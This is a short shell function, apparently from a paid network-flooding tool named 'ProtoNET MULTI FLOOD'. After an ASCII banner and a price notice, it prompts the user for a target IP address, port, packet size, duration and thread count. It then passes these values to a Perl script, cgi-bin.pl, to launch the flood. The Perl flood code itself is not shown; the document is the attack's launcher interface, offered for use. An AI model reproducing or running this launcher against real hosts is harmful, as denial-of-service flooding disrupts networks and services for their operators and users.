multi()
{
    clear
    echo -e " $CYAN} "
    echo "               ProtoNET MULTI FLOOD UPDATED "   
    echo "Script created by AlphaZ and get updated by Morten"
    echo ""	
    echo -e "        '||    ||'          '||    .    || " 
    echo -e "         |||  |||  ... ...   ||  .||.  ...  "
    echo -e "         |'|..'||   ||  ||   ||   ||    ||  "
    echo -e "         | '|' ||   ||  ||   ||   ||    ||  "
    echo -e "        .|. | .||.  '|..'|. .||.  '|.' .||. "
    echo ""
    echo "    If you wish to unlock this it will cost 5 bucks."
    echo ""
echo "Enter IP Address:"
read ip
echo "Enter Port:"
read port
echo "Enter size Ex: 65500"
read size
echo "Enter The Time In Seconds:"
read time
echo "Enter The Thread Count:"
read threads
echo "Would you like to see the output WARNING if yes flood may slow down! 0=No 1=Yes"
read output
perl cgi-bin.pl $ip $port $size $time $threads $output
}

